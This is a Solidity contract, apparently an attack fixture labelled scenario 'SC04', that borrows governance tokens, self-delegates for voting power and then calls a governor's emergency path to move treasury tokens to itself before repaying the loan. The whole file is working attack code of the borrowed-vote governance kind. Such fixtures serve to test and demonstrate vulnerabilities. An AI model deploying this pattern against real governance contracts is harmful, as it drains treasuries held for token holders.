// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { GovToken } from "shared/GovToken.sol";
import { KestrelGovernor } from "kestrel/KestrelGovernor.sol";

/// @notice SC04 (non-flash variant): holds borrowed governance tokens for a single block, as
///         from any ordinary lending market, self-delegates, and in the next block uses the
///         emergency path to move the treasury before returning the stake.
contract BorrowedStakeAttacker {
    /// @notice Governance token.
    GovToken public immutable token;
    /// @notice Target governor.
    KestrelGovernor public immutable governor;

    /// @param _token Governance token.
    /// @param _governor Target governor.
    constructor(GovToken _token, KestrelGovernor _governor) {
        token = _token;
        governor = _governor;
    }

    /// @notice Block N: self-delegate the borrowed stake so it becomes voting power.
    function delegateSelf() external {
        token.delegate(address(this));
    }

    /// @notice Block N+1: move `amount` treasury tokens here through the emergency path, then
    ///         return the borrowed stake to `stakeLender`.
    /// @param amount Treasury tokens to take.
    /// @param stakeLender Account the stake is returned to.
    /// @param stake Borrowed amount to return.
    function drain(uint256 amount, address stakeLender, uint256 stake) external {
        governor.emergencyExecute(address(token), 0, abi.encodeCall(IERC20.transfer, (address(this), amount)));
        token.transfer(stakeLender, stake);
    }
}
